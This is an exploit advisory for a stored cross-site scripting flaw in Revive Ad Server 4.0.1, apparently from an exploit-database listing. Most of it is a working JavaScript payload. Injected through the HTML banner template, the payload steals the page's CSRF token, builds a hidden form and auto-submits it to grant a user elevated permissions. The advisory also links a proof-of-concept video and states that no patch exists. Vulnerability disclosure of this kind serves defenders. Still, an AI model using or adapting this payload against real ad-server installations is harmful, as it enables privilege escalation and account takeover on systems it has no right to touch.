# Exploit Title: XSRF Stored Revive Ad Server 4.0.1
# Date: 24/04/2017
# Exploit Author: Cyril Vallicari / HTTPCS / ZIWIT
# Vendor Website : https://www.revive-adserver.com/
# Software download : https://www.revive-adserver.com/download/
# Version: 4.0.1
# Tested on: Windows 7 x64 SP1 / Kali Linux
 
 
Description :
 
A vulnerability has been discovered in Revive Ad Server, which can be
exploited by malicious people to conduct cross-site scripting attacks.
When you create a banner using Generic HTML Banner, input
 
passed via the &#039;htmltemplate&#039; parameter to &#039;/banner-edit.php&#039; is not
 
properly sanitised before being returned to the user (This is probably
expected as it&#039;s an html banner). But, this can be exploited
to execute arbitrary HTML and script code in a user&#039;s browser session in
context of an affected site.
 
 
This XSS vector allow to execute scripts to gather the CSRF token
 
and submit a form to update user rights
 
 
Here&#039;s the script :
 
---------------------- Javascript-------------------------------
 
var tok = document.getElementsByName(&#039;token&#039;)[0].value;
 
var txt = &#039;<form method="POST" id="hacked" action="agency-user.php">&#039;
txt += &#039;<input type="hidden" name="submit[]" value="1"/>&#039;
txt += &#039;<input type="hidden" name="token" value="&#039; + tok + &#039;"/>&#039;
txt += &#039;<input type="hidden" name="userid" value="2"/>&#039;
txt += &#039;<input type="hidden" name="email_address" value="test2@test.com"/>&#039;
txt += &#039;<input type="hidden" name="agencyid" value="1"/>&#039;
txt += &#039;<input type="hidden" name="permissions[]" value="10"/>&#039;
txt += &#039;</form>&#039;
 
var d1 = document.getElementById(&#039;firstLevelContent&#039;);
 
d1.insertAdjacentHTML(&#039;afterend&#039;, txt);
 
document.getElementById("hacked").submit();
 
 
---------------------- Javascript End-------------------------------
 
(little trick to submit a form that has a "submit" parameter, just use a
list "submit[]")
 
This will update user rights and allow to manage accounts
 
POC video : https://www.youtube.com/watch?v=wFuN-ADlJpM
 
Patch : No patch yet

